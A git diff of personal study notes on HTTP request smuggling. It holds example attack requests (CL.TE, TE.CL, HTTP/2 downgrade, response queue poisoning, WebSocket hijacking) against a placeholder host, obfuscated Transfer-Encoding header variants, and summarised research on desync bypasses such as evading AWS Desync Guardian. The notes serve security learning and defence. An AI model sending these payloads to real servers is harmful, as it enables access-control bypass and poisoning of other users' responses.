@@ -165,14 +165,13 @@ Modern variations include:
 - **Differential Testing**: Observe response timing differences
 - **Time Delays**: Add artificial delays between requests to detect queue interference
 - **Obfuscation Testing**: Try various obfuscation techniques:
-  ```http
+  ```
   Transfer-Encoding: xchunked
   Transfer-Encoding: chunked
   Transfer-Encoding : chunked
   Transfer-Encoding: chunked
   Transfer-Encoding: identity, chunked
   ```
-
   - HTTP/2 Specific: Duplicate `content-length` headers, mixed/malformed pseudo-headers, abnormal stream resets, header/continuation frame splitting.
 
 ### Testing Methodology
@@ -295,7 +294,7 @@ mindmap
 
 1. **CL.TE Pattern**:
 
-   ```http
+```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 39
@@ -305,11 +304,9 @@ mindmap
 
    GET /admin HTTP/1.1
    Host: vulnerable-website.com
-   ```
-
+```
 2. **TE.CL Pattern**:
-
-   ```http
+ ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 4
@@ -323,11 +320,10 @@ mindmap
    x=1
    0
 
-   ```
-
+```
 3. **HTTP/2 Downgrade Pattern**:
 
-   ```http
+```http
    :method: POST
    :path: /
    :authority: vulnerable-website.com
@@ -336,10 +332,10 @@ mindmap
 
    GET /admin HTTP/1.1
    Host: vulnerable-website.com
-   ```
+```
 
 4. **H2C Upgrade Smuggling Pattern**:
-```
+```http
 GET / HTTP/1.1
 Host: vulnerable-website.com
 Connection: Upgrade, HTTP2-Settings
@@ -364,11 +360,10 @@ Host: vulnerable-website.com
 
    GET / HTTP/1.1
    Host: vulnerable-website.com
-   ```
-
+```
 2. **Response Queue Poisoning**:
 
-   ```http
+```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 146
@@ -381,11 +376,10 @@ Host: vulnerable-website.com
    Content-Length: 30
 
    <html>Fake Response</html>
-   ```
-
+```
 3. **WebSocket Hijacking**:
 
-   ```http
+```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 65
@@ -396,8 +390,7 @@ Host: vulnerable-website.com
    GET /socket HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
-   ```
-
+```
 ### Defense Testing
 
 1. **Testing Patch Effectiveness**:
@@ -745,3 +738,70 @@ Transfer-Encoding: chunked\x0d\x0a
 - **WebSocket Security**: Validate WebSocket upgrade requests; sanitize Sec-WebSocket-\* headers; limit concurrent upgrades
 - **Client-Side Desync Prevention**: Set `Connection: close` on sensitive responses; use HTTP/2 exclusively; implement strict cache controls
 - **Monitoring**: Log anomalous header patterns; alert on multiple Content-Length or Transfer-Encoding headers; track connection reuse metrics
+
+## HTTP/1.1 must die: the desync endgame
+
+- HTTP/1.1 has a fatal, highly-exploitable flaw - the boundaries between individual HTTP requests are very weak. Requests are simply concatenated on the underlying TCP/TLS socket with no delimiters
+- As HTTP/1.1 is an ancient, lenient, text-based protocol with thousands of implementations, finding parser discrepancies is not hard
+### Mitigations that hide but don't fix
+> [!note]
+`CL == (Content-Length)`
+`TE == (Transfer-Encoding)` 
+`0 == (Implicit-zero)` 
+`H2 == (HTTP/2's built-in length)`
+- [ ] downgrade incoming HTTP/2 requests to HTTP/1.1 ?
+> [!question] why CL.TE fails now ?
+- [ ] ==WAFs now use regexes==: 
+	-  obfuscated Transfer-Encoding header
+	-  potential HTTP requests in the body.
+- The /robots.txt detection gadget doesn't work on your particular target.
+	- timeout-based detection strategy is blocked by WAFs too
+- There's a ==server-side race condition== which makes this technique highly unreliable on certain targets.
+#### Hacking 20 million websites by accident
+- ![[Pasted image 20260116233518.png]]
+-  By ignoring the fact his attack was being blocked by a cache, Wannes had discovered a HTTP/1.1 desync internal to Cloudflare's infrastructure 
+	- ![[Pasted image 20260116233536.png]]
+	- we can infer that requests sent to Cloudflare over HTTP/2 are sometimes rewritten to HTTP/1.1 for internal use, then rewritten again to HTTP/2 for the upstream connection!
+#### "HTTP/1 is simple" and other lies
+- Lie 1: An HTTP/1.1 request can't directly target an intermediary
+- Lie 2: An HTTP/1.1 desync can only be caused by a parser discrepancy
+- Lie 3: An HTTP/1.1 response contains everything a proxy needs to parse it
+- Lie 4: An HTTP/1.1 response can only contain one header block
+- Lie 5: A complete HTTP/1.1 response requires a complete request
+the reality behind the last three lies is that :
+> [!note]
+> -  your proxy needs a reference to the request object just to read the correct number of response bytes off the TCP socket from the back-end
+> - you need control-flow branches to handle multiple header blocks even before you even reach the response body
+> - the entire response may arrive before the client has even finished sending you the request.
+## A strategy to win the desync endgame
+- Daniel Thacher presented [Practical HTTP Header Smuggling](https://www.youtube.com/watch?v=RAtpG6OYYNM) -> [HTTP Request Smuggler v3.0](https://github.com/PortSwigger/http-request-smuggler/).
+	- ![[Pasted image 20260117000512.png]]
+### Understanding V-H and H-V discrepancies
+- [ ] ![[Pasted image 20260117001145.png]] => parser discrepancy (All that matters is that they're different)
+- **Visible-Hidden (V-H)**: The masked Host header is visible to the front-end, but hidden from the back-end
+- **Hidden-Visible (H-V)**: The masked Host header is hidden from the front-end, but visible to the back-end
+#### Turning a V-H discrepancy into a CL.0 desync
+- [ ] ==TE.CL== exploit by hiding the Transfer-Encoding header from the back-end
+- [ ] ==CL.0 ==exploit by hiding the Content-Length header
+![[Pasted image 20260117001705.png]]
+- front-end server was rejecting GET requests that contained a body? 
+	- [ ] switching the method to OPTIONS
+- [ ] same header (Host), and the same permutation (leading space before header name), but a different strategy (duplicate Host with invalid value) 
+  ![[Pasted image 20260117002011.png]]
+> [!note] web VPNs often have flawed HTTP implementations and I would strongly advise against placing one behind any kind of reverse proxy
+- [ ] not treating `\n\n` as terminating the header block
+    ![[Pasted image 20260117002447.png]]
+#### Exploiting H-V on IIS behind ALB (AWS Application Load Balancer)
+- The classic way to exploit a H-V discrepancy is with a ==CL.TE desync== ![[Pasted image 20260117002654.png]]
+- this gets blocked by AWS' [Desync Guardian](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html#desync-mitigation-mode) 
+	- Thomas Stacey [independently discovered it](https://assured.se/posts/the-single-packet-shovel-desync-powered-request-tunnelling) and bypassed it using H2.TE desync
+	- Even with the H2.TE bypass fixed, attackers can still exploit this to smuggle headers, enabling IP-spoofing and [sometimes complete authentication bypass](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#explore).
+- AWS didnt patched it (backward compatibility)
+#### Exploiting H-V without Transfer-Encoding
+- **The 0.CL deadlock**
+	- The front-end doesn't see the Content-Length header, so it will regard the orange payload as the start of a second request![[Pasted image 20260117030425.png]]
+	- The back end does see the Content-Length header, so it will wait for the body to arrive. Meanwhile, the front-end will wait for the back-end to reply => deadlock![[Pasted image 20260117030506.png]]
+- [ ] ==a way to make the back-end server respond to a request without waiting for the body to arrive== 
+	- [ ] Linux: [single-packet attack](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local) on a static file on a target running nginx
+	- [ ] Windows: `CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7...` as the name of the file
+/git
